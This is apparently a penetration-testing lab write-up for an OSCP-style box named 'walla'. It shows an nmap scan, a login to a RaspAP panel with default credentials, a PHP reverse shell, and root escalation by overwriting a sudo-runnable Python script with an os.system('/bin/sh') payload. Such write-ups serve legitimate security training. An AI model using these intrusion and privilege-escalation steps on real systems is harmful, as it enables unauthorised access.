`nmap -A -T4 -p- 192.168.152.97`

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
|_http-server-header: lighttpd/1.4.53
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
```


## 8091 

Basic HTTP auth
![](Images/Pasted%20image%2020250506140027.png)

```
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
```

I looked up RaspAP and found default credentials `admin:secret` and got authentication. Within the system tab is a shell console

![](Images/Pasted%20image%2020250506145336.png)

Lets establish a standard shell before moving forward.

![](Images/Pasted%20image%2020250506145922.png)

Transferred over a basic php reverse shell and setup a listener and ran it to establish a shell usable for the OSCP.

![](Images/Pasted%20image%2020250506145955.png)

Some quick enumeration shows us our next move to the user walter

![](Images/Pasted%20image%2020250506150044.png)

Since we have can run python as root we can modify the wifi_reset.py in order to escalate our shell.  First lets grab out local flag.

![](Images/Pasted%20image%2020250506150202.png)

The file wifi_reset.py is not writeable but we can probably just remove it and then make a new one. Since we will get sudo level execution it won't matter.

```
echo 'import os; os.system("/bin/sh")' > wifi_reset.py
```

![](Images/Pasted%20image%2020250506151146.png)

```
sudo /usr/bin/python /home/walter/wifi_reset.py
```

![](Images/Pasted%20image%2020250506151230.png)



